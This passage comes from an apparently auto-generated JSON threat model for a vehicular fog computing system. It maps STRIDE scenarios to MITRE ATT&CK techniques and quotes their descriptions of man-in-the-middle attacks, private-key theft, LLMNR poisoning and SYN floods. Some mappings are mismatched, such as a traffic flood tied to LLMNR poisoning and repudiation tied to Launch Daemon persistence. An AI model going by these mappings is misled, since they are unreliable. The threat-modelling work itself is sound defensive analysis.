attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies data being sent from smart vehicles to fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission between smart vehicles and fog nodes is not encrypted.",
                    "Role": "Attacker",
                    "Condition": "Valid if communications are not secured."
                },
                {
                    "Assumption": "No integrity check for data received by fog nodes.",
                    "Role": "Fog Node",
                    "Condition": "Valid if received data is not validated."
                },
                {
                    "Assumption": "Attacker has network access between smart vehicles and fog nodes.",
                    "Role": "Attacker",
                    "Condition": "Valid if network is not secured properly."
                }
            ],
            "Potential Impact": "Data integrity compromised, leading to potentially dangerous incorrect processing and actions by fog nodes.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data modification",
                "network",
                "injection"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies firmware on fog nodes to alter their functionality.",
            "Assumptions": [
                {
                    "Assumption": "Fog node firmware updates are not secured.",
                    "Role": "Attacker",
                    "Condition": "Valid if no integrity checks and secure delivery for updates."
                },
                {
                    "Assumption": "Attacker has access to physical or network path to fog nodes.",
                    "Role": "Attacker",
                    "Condition": "Valid if physical or network access controls are weak."
                },
                {
                    "Assumption": "The fog node does not have mechanisms to detect unauthorized firmware.",
                    "Role": "Fog Node",
                    "Condition": "Valid if fog nodes do not verify firmware integrity."
                }
            ],
            "Potential Impact": "System integrity and functionality are severely impacted, potentially causing incorrect processing and data flows.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware modification",
                "device",
                "data corruption"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies data during transmission from fog nodes to cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission from fog nodes to cloud services is not encrypted.",
                    "Role": "Attacker",
                    "Condition": "Valid if communications are in plain text."
                },
                {
                    "Assumption": "Cloud services do not validate data integrity.",
                    "Role": "Cloud Service",
                    "Condition": "Valid if data validation and checks are not in place."
                },
                {
                    "Assumption": "Attacker has access to network paths used for transmission.",
                    "Role": "Attacker",
                    "Condition": "Valid if network security is weak or compromised."
                }
            ],
            "Potential Impact": "Compromised data integrity and potential false analysis outcomes resulting from corrupted data.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data modification",
                "network",
                "data interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A legitimate user denies sending a specific command to a smart vehicle.",
            "Assumptions": [
                {
                    "Assumption": "No proper logging and audit trails for user actions.",
                    "Role": "System",
                    "Condition": "Valid if logs are not securely maintained and audited."
                },
                {
                    "Assumption": "Commands are not digitally signed.",
                    "Role": "User",
                    "Condition": "Valid if no digital signatures are used for verification."
                },
                {
                    "Assumption": "System does not provide non-repudiation.",
                    "Role": "System",
                    "Condition": "Valid if non-repudiation mechanisms like logs and signatures are missing."
                }
            ],
            "Potential Impact": "System accountability is compromised, and unauthorized actions might go untraceable.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log modification",
                "audit trail",
                "digital signature"
            ],
            "mitre_technique": {
                "name": "Private Keys",
                "description": "Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. (Citation: Wikipedia Public Key Crypto)\n\nAdversaries may gather private keys from compromised systems for use in authenticating to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. Adversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:\\Users\\(username)\\.ssh\\</code> on Windows.\n\nPrivate keys should require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line.\n\nAdversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates. (Citation: Kaspersky Careto) (Citation: Palo Alto Prince of Persia)",
                "id": "attack-pattern--56ff457d-5e39-492b-974c-dfd2b8603ffe",
                "technique_id": "T1145"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A fog node admin denies making configuration changes to fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Lack of secure audit logging for configuration changes.",
                    "Role": "System",
                    "Condition": "Valid if changes are not logged securely."
                },
                {
                    "Assumption": "System allows changes without proper authentication.",
                    "Role": "System",
                    "Condition": "Valid if changes can be made without strong auth."
                },
                {
                    "Assumption": "No mechanisms to verify identity of the administrator.",
                    "Role": "System",
                    "Condition": "Valid if identity verification is weak or missing."
                }
            ],
            "Potential Impact": "Compromise of system accountability and potential unauthorized configuration changes.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "configuration change",
                "log modification",
                "system integrity"
            ],
            "mitre_technique": {
                "name": "Launch Daemon",
                "description": "Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in <code>/System/Library/LaunchDaemons/</code> and <code>/Library/LaunchDaemons/</code>. Required Launch Daemons parameters include a <code>Label</code> to identify the task, <code>Program</code> to provide a path to the executable, and <code>RunAtLoad</code> to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.(Citation: AppleDocs Launch Agent Daemons)(Citation: Methods of Mac Malware Persistence)(Citation: launchd Keywords for plists)\n\nAdversaries may install a Launch Daemon configured to execute at startup by using the <code>RunAtLoad</code> parameter set to <code>true</code> and the <code>Program</code> parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. [Masquerading](https://attack.mitre.org/techniques/T1036)). When the Launch Daemon is executed, the program inherits administrative permissions.(Citation: WireLurker)(Citation: OSX Malware Detection)\n\nAdditionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as <code>usr/local/bin</code> to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.(Citation: LaunchDaemon Hijacking)(Citation: sentinelone macos persist Jun 2019)",
                "id": "attack-pattern--573ad264-1371-4ae0-8482-d2673b719dba",
                "technique_id": "T1543.004"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies uploading data that causes an anomaly in the VFC system.",
            "Assumptions": [
                {
                    "Assumption": "No secure logging mechanism for user data uploads.",
                    "Role": "System",
                    "Condition": "Valid if user actions including uploads are not logged."
                },
                {
                    "Assumption": "System does not verify and track data upload sources.",
                    "Role": "System",
                    "Condition": "Valid if upload sources are not authenticated."
                },
                {
                    "Assumption": "Data uploads are not signed or traceable.",
                    "Role": "User",
                    "Condition": "Valid if uploads are not attributed and traceable."
                }
            ],
            "Potential Impact": "Accountability issues and potential difficulty in identifying malicious or erroneous data sources.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "data upload",
                "log modification",
                "system integrity"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted data traffic between smart vehicles and fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Lack of encryption for data in transit.",
                    "Role": "Attacker",
                    "Condition": "Valid if data is transmitted in plain text."
                },
                {
                    "Assumption": "Attacker has access to network paths used by VFC.",
                    "Role": "Attacker",
                    "Condition": "Valid if network access is compromised."
                },
                {
                    "Assumption": "No secure communication protocols in place.",
                    "Role": "System",
                    "Condition": "Valid if secure protocols like TLS are not used."
                }
            ],
            "Potential Impact": "Compromise of data confidentiality leading to unauthorized access to sensitive information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "man-in-the-middle",
                "network",
                "data interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains unauthorized access to stored data on fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Sensitive data on fog nodes is not encrypted.",
                    "Role": "Attacker",
                    "Condition": "Valid if data stored in plain text on fog nodes."
                },
                {
                    "Assumption": "Unauthorized access mechanisms are exploitable.",
                    "Role": "Attacker",
                    "Condition": "Valid if access controls are weak or compromised."
                },
                {
                    "Assumption": "Fog nodes lack proper access control policies.",
                    "Role": "System",
                    "Condition": "Valid if access policies are not strictly enforced."
                }
            ],
            "Potential Impact": "Sensitive information is disclosed, risking privacy and potentially violating regulations.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "unauthorized access",
                "data at rest",
                "insider threat"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Data sent from fog nodes to cloud services is intercepted by an attacker.",
            "Assumptions": [
                {
                    "Assumption": "Data is not encrypted during transmission.",
                    "Role": "Attacker",
                    "Condition": "Valid if transmissions are unencrypted."
                },
                {
                    "Assumption": "Attacker has access to the transmission path.",
                    "Role": "Attacker",
                    "Condition": "Valid if network paths are not secured."
                },
                {
                    "Assumption": "No secure communication protocols are followed.",
                    "Role": "System",
                    "Condition": "Valid if secure protocols like TLS are missing."
                }
            ],
            "Potential Impact": "Disclosure of sensitive information to unauthorized entities.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data interception",
                "network",
                "man-in-the-middle"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods fog nodes with high-volume traffic causing a slowdown or crash.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes cannot handle high-volume traffic bursts.",
                    "Role": "Fog Node",
                    "Condition": "Valid if nodes are not designed to manage high traffic."
                },
                {
                    "Assumption": "Attacker has network access to fog nodes.",
                    "Role": "Attacker",
                    "Condition": "Valid if attacker can reach the network of fog nodes."
                },
                {
                    "Assumption": "No rate limiting or traffic filtering implemented.",
                    "Role": "System",
                    "Condition": "Valid if traffic levels are not regulated."
                }
            ],
            "Potential Impact": "System availability affected as critical processing is delayed or crashes, affecting service delivery.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "traffic flooding",
                "network",
                "system crash"
            ],
            "mitre_technique": {
                "name": "LLMNR/NBT-NS Poisoning and Relay",
                "description": "Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",
                "id": "attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0",
                "technique_id": "T1171"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker sends malformed data packets to fog nodes causing them to malfunction.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes do not sanitize or validate incoming data.",
                    "Role": "Fog Node",
                    "Condition": "Valid if data is processed without validation."
                },
                {
                    "Assumption": "Attacker can send data packets to fog nodes' network.",
                    "Role": "Attacker",
                    "Condition": "Valid if network access is not restricted."
                },
                {
                    "Assumption": "System lacks protection mechanisms against malformed data.",
                    "Role": "System",
                    "Condition": "Valid if no intrusion detection or prevention systems in place."
                }
            ],
            "Potential Impact": "Availability of system impacted by malfunctioning fog nodes, leading to potential service disruptions.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "data packet",
                "network",
                "system malfunction"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware installed on smart vehicles or fog nodes causing a resource exhaustion attack.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient malware protection on smart vehicles and fog nodes.",
                    "Role": "System",
                    "Condition": "Valid if anti-malware measures are lacking."
                },
                {
                    "Assumption": "Malware can be transferred and executed on system nodes.",
                    "Role": "Attacker",
                    "Condition": "Valid if nodes accept and run unverified code."
                },
                {
                    "Assumption": "System lacks resource monitoring and reactive measures.",
                    "Role": "System",
                    "Condition": "Valid if there are no measures for monitoring resource use or mitigating excessive usage."
                }
            ],
            "Potential Impact": "Availability of system services degraded or completely halted due to resource exhaustion.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malware",
                "resource exhaustion",
                "system crash"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains administrative access to fog nodes via a vulnerability.",
            "Assumptions": [
                {
                    "Assumption": "Existence of unpatched vulnerabilities in fog nodes.",
                    "Role": "Attacker",
                    "Condition": "Valid if vulnerabilities are unaddressed."
                },
                {
                    "Assumption": "No multi-factor authentication for administrative access.",
                    "Role": "Fog Node",
                    "Condition": "Valid if weak or single-factor authentication is used."
                },
                {
                    "Assumption": "Fog nodes lack proper access control mechanisms.",
                    "Role": "System",
                    "Condition": "Valid if access control policies are weak or missing."
                }
            ],
            "Potential Impact": "An attacker could take full control of fog nodes, compromising data and services.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "unauthorized access",
                "vulnerability",
                "admin rights"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker escalates privileges on a compromised smart vehicle to access sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Smart vehicle software has exploitable vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Valid if unpatched vulnerabilities exist."
                },
                {
                    "Assumption": "No least privilege enforcement for smart vehicle software.",
                    "Role": "Smart Vehicle",
                    "Condition": "Valid if excessive privileges are granted to software/components."
                },
                {
                    "Assumption": "Authentication mechanisms can be bypassed.",
                    "Role": "Attacker",
                    "Condition": "Valid if bypass mechanisms are available."
                }
            ],
            "Potential Impact": "Sensitive vehicle-generated data could be accessed and manipulated.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "unauthorized access",
                "smart vehicle",
                "data compromise"
            ],
            "mitre_technique": {
                "name": "Exploitation for Credential Access",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0\n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
                "id": "attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36",
                "technique_id": "T1212"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker escalates privileges within the cloud services managing VFC data.",
            "Assumptions": [
